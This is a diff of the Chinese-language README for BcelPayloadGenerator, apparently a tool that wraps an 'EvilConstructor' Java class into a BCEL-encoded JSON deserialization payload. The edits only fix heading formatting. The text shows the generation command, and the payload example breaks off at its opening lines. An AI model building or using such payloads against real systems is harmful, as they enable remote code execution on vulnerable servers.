@@ -1,8 +1,8 @@
 # BcelPayloadGenerator
 
-###1.准备好EvilConstructor的.class文件，放在任意文件内
+### 1.准备好EvilConstructor的.class文件，放在任意文件内
 
-###2.执行生成payload
+### 2.执行生成payload
 
 命令：
 
@@ -15,9 +15,9 @@ Demo:
 java -cp BcelGenerator-1.0-SNAPSHOT-jar-with-dependencies.jar com.example.App file:///D:/EvilConstructor.class EvilConstructor
 ```
 
-###3.生成Payload
-第一个包：
+### 3.生成Payload
 
+第一个包：
 ```
 {"name": 
 	{
